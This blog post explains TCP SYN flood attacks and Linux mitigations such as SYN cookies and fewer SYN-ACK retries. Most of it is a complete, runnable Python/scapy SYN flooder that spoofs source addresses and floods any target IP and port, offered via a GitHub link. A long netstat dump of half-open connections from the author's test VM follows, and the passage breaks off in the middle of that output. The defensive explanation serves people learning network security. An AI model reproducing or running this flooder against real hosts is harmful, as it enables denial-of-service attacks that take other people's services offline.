{"metadata":{"date":"Jun 22, 2016","title":"Creating SYN flood attacks with Python","template":"post","slug":"creating-syn-flood-attacks-with-python","categories":["Network Security"],"tags":["Network Security"]},"content":"<p>Today it's very easy for people to download tools that overwhelm computer systems <em>(denial of service)</em> in order to take them offline. There are different types of attacks that can be used to create a denial of service attack, one of them is the SYN flood attack which this article will cover. I will also show how to develop your own SYN flooder and some protection mitigations.</p>\n<h2>What is a SYN flood attack?</h2>\n<p>The SYN flood attack works by the attacker opening multiple \"half made\" connections and not responding to any <code>SYN_ACK</code> packets. In order to understand the SYN flood attack it is vital to understand the TCP 3-way handshake first.</p>\n<h3>TCP handshake</h3>\n<p>When a client wants to talk to a server over TCP, the client initiates what is called the <em>3-way handshake</em>. It begins with the client sending a <code>SYN</code> packet to the server, the server receives the packet and responds with a <code>SYN_ACK</code> indicating to the client that it received the initial <code>SYN</code> packet. When the client receives the <code>SYN_ACK</code> it will reply with an <code>ACK</code> packet which now establishes a connection between the client and server and they can begin exchanging data. A visual representation can be seen below.</p>\n<p>IMAGE HERE</p>\n<h3>The SYN flood attack</h3>\n<p>We now know that clients and servers establishes a connection by completing a handshake with each other, what happens if you do not complete the handshake? By sending multiple <code>SYN</code> packets to the victim and not responding with an <code>ACK</code> message to the victim's <code>SYN_ACK</code> message, the victim will have a multiple \"half\" open connections causing the victim's connection table to potentially overflow .</p>\n<h3>SYN spoofing</h3>\n<p>An attacker could also spoof the source address of the initial <code>SYN</code> packets causing the victim to send <code>SYN_ACK</code> messages to an other host, which will respond with a <code>RST</code> packet indicating to drop the connection causing the SYN attack to fail. In order for the spoofing to work the attacker needs to select source addresses where there exists no hosts that can respond.</p>\n<h2>Protection</h2>\n<p>There are different ways to limit the effects of SYN flood/spoof attacks, some of are:</p>\n<h4>Remove random connections</h4>\n<p>Start deleting random \"half made\" connections, this can however delete legitimate connections.</p>\n<h4>Reduce time in SYN_RECEIVED state</h4>\n<p>When you send SYN packet to a server the connection will be placed in a <code>SYN_RECV</code> state and the server will respond with a <code>SYN_ACK</code> packet. The server will resend <code>SYN_ACK</code> a few times until an <code>ACK</code> is received, during this time the connection is still placed in a <code>SYN_RECV</code> state. This means the server needs to keep track of thousands of connections which can overflow the server's connection table. By reducing the <code>SYN_ACK</code> retries the server will close connections placed in a <code>SYN_RECV</code> state earlier which can be very helpful protecting against SYN flood attacks.</p>\n<p>In Linux you can edit <strong>/etc/sysctl.conf</strong> and change <code>net.ipv4.tcp_synack_retries</code> from the default value 5 to something lower depending on fast you want your system to close connections in a <code>SYN_RECV</code> state. The default value 5 leaves connections in <code>SYN_RECV</code> state open for 3 minutes and a value of 3 leaves connections open for roughly 45 seconds. After you have modified the file you can make your changes permanent by running <code>sysctl –p /etc/sysctl.conf</code> and verify that is has been changed by:</p>\n<pre><code class=\"hljs language-gradle\">root@ajax:~# cat <span class=\"hljs-regexp\">/proc/</span>sys<span class=\"hljs-regexp\">/net/i</span>pv4/tcp_synack_retries\n<span class=\"hljs-number\">1</span>\n</code></pre>\n<h4>SYN cookies</h4>\n<p>Instead of the server keeping track of states for each connection which allocates memory, we can use SYN cookies instead. When a <code>SYN</code> is received a hash is computed based on meta information. The receiver (server) sends a <code>SYN_ACK</code> with the hash and does not allocate any memory yet, only the hash is stored. The hash consists of the the following:</p>\n<pre><code class=\"hljs language-lisp\">Initial Sequence Number (<span class=\"hljs-name\">ISN</span>) = hash(<span class=\"hljs-name\">source_ip</span>, source_port, destination_ip, destination_port, client's ISN, secret)\n</code></pre>\n<p>The sender must send an <code>ACK</code> with this hash so that the receiver can compare with the stored hash, if success than allocate memory and data structures.</p>\n<p>Enabling SYN cookies in linux is very easy. Edit the file <strong>/etc/sysctl.conf</strong> and make the following modification:</p>\n<pre><code class=\"hljs language-apache\"><span class=\"hljs-attribute\">net</span>.ipv<span class=\"hljs-number\">4</span>.tcp_syncookies = <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>Save and run <code>sysctl -p</code> to make the change permanent.</p>\n<h2>Building a simple SYN flooder with Python using scapy</h2>\n<p>Building your own SYN flooder is not difficult and can easily be done with Python and scapy. Below I have written a simple SYN flooder that will send spoofed SYN packets to any target. The program will send 64511 SYN packets <em>per spoofed IP</em> which means a total of 16 385 794 packets!</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\">#!/usr/bin/env python3</span>\n\n<span class=\"hljs-string\">\"\"\"Simple SYN Flooder and spoofer\n - @mjdubell\n\nThis software is intended for educational purposes and\ncan only be used against systems with permission from owner.\nThe user is the only one responsible for any damages. By using this\nsoftware you agree with the terms.\n\nUsage:\n  syn_flooder.py &#x3C;dst_ip> &#x3C;dst_port> [--sleep=&#x3C;sec>] [--verbose] [--very-verbose]\n\nOptions:\n  -h, --help            Show this screen.\n  --version             Show version.\n  --sleep=&#x3C;seconds>     How many seconds to sleep betseen scans [default: 0].\n  --verbose             Show addresses being spoofed. [default: False]\n  --very-verbose        Display everything. [default: False]\n\n\"\"\"</span>\n<span class=\"hljs-keyword\">from</span> docopt <span class=\"hljs-keyword\">import</span> docopt\n<span class=\"hljs-keyword\">import</span> logging\n<span class=\"hljs-keyword\">import</span> signal\n<span class=\"hljs-keyword\">import</span> sys\nlogging.getLogger(<span class=\"hljs-string\">\"scapy.runtime\"</span>).setLevel(logging.ERROR)\n<span class=\"hljs-keyword\">from</span> scapy.<span class=\"hljs-built_in\">all</span> <span class=\"hljs-keyword\">import</span> *\n\n\n<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">main</span>(<span class=\"hljs-params\">arguments</span>):</span>\n    src_net = <span class=\"hljs-string\">\"192.168.250.\"</span>\n    dst_ip = arguments[<span class=\"hljs-string\">\"&#x3C;dst_ip>\"</span>]\n    dst_port = <span class=\"hljs-built_in\">int</span>(arguments[<span class=\"hljs-string\">\"&#x3C;dst_port>\"</span>])\n    sleep = <span class=\"hljs-built_in\">int</span>(arguments[<span class=\"hljs-string\">\"--sleep\"</span>])\n    verbose = arguments[<span class=\"hljs-string\">\"--verbose\"</span>]\n    very_verbose = arguments[<span class=\"hljs-string\">\"--very-verbose\"</span>]\n\n    signal.signal(signal.SIGINT, <span class=\"hljs-keyword\">lambda</span> n, f: sys.exit(<span class=\"hljs-number\">0</span>))\n\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"\\n###########################################\"</span>)\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"# Starting Denial of Service attack...\"</span>)\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f\"# Target: <span class=\"hljs-subst\">{dst_ip}</span>\"</span>)\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"###########################################\\n\"</span>)\n    <span class=\"hljs-keyword\">for</span> src_host <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">254</span>):\n        <span class=\"hljs-keyword\">if</span> verbose <span class=\"hljs-keyword\">or</span> very_verbose:\n            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f\"[*] Sending spoofed SYN packets from <span class=\"hljs-subst\">{src_net}</span><span class=\"hljs-subst\">{src_host}</span>\"</span>)\n            <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"--------------------------------------------\"</span>)\n\n        <span class=\"hljs-keyword\">for</span> src_port <span class=\"hljs-keyword\">in</span> <span class=\"hljs-built_in\">range</span>(<span class=\"hljs-number\">1024</span>, <span class=\"hljs-number\">65535</span>):\n            <span class=\"hljs-keyword\">if</span> very_verbose:\n                <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">f\"[+] Sending a spoofed SYN packet from <span class=\"hljs-subst\">{src_net}</span><span class=\"hljs-subst\">{src_host}</span>:<span class=\"hljs-subst\">{src_port}</span>\"</span>)\n\n            <span class=\"hljs-comment\"># Build the packet</span>\n            src_ip = src_net + <span class=\"hljs-built_in\">str</span>(src_host)\n            network_layer = IP(src=src_ip, dst=dst_ip)\n            transport_layer = TCP(sport=src_port, dport=dst_port, flags=<span class=\"hljs-string\">\"S\"</span>)\n\n            <span class=\"hljs-comment\"># Send the packet</span>\n            send(network_layer/transport_layer, verbose=<span class=\"hljs-literal\">False</span>)\n\n            <span class=\"hljs-keyword\">if</span> sleep != <span class=\"hljs-number\">0</span>:\n                time.sleep(sleep)\n\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[+] Denial of Service attack finished.\"</span>)\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">'__main__'</span>:\n    arguments = docopt(__doc__, version=<span class=\"hljs-string\">\"SYN Flooder 1.5\"</span>)\n    main(arguments)\n\n</code></pre>\n<h5>Project can be found here: <a href=\"https://github.com/mjdubell/SYN-Flooder\">https://github.com/mjdubell/SYN-Flooder</a></h5>\n<p>I ran the program against my debian virtual machine to see if my code worked:</p>\n<pre><code class=\"hljs language-apache\"><span class=\"hljs-attribute\">root</span>@ajax:~# netstat -antp\n<span class=\"hljs-attribute\">Active</span> Internet connections (servers and established)\n<span class=\"hljs-attribute\">Proto</span> Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">127.0.0.1:25</span>            <span class=\"hljs-number\">0.0.0.0</span>:*               LISTEN      <span class=\"hljs-number\">790</span>/exim<span class=\"hljs-number\">4</span>\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0.0.0.0:58873</span>           <span class=\"hljs-number\">0.0.0.0</span>:*               LISTEN      <span class=\"hljs-number\">509</span>/rpc.statd\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0.0.0.0:111</span>             <span class=\"hljs-number\">0.0.0.0</span>:*               LISTEN      <span class=\"hljs-number\">500</span>/rpcbind\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">0.0.0.0:22</span>              <span class=\"hljs-number\">0.0.0.0</span>:*               LISTEN      <span class=\"hljs-number\">525</span>/sshd\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2045</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1885</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1828</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1878</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1102</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1090</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1148</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1101</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1129</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1172</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1169</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1173</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1829</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1089</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2056</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2040</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1247</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1153</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1072</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1143</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1881</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1852</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1274</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2057</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1277</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1088</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1880</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1164</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1119</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1860</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1134</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1163</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1115</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1075</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1876</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1250</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1103</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2061</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1186</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1109</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1135</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1883</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1168</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1887</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2066</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1191</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1141</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1827</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1246</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2041</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1892</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2035</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2073</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1255</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1145</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1144</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1151</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1147</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1161</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1890</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1104</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1863</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1194</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1128</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1278</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1259</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1193</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1187</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1851</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1266</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1263</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1251</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1181</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2036</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1895</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1154</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1125</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1182</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:2072</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span class=\"hljs-number\">192.168.3.1:1265</span>        SYN_RECV    -\n<span class=\"hljs-attribute\">tcp</span>        <span class=\"hljs-number\">0</span>      <span class=\"hljs-number\">0</span> <span class=\"hljs-number\">192.168.1.93:22</span>         <span 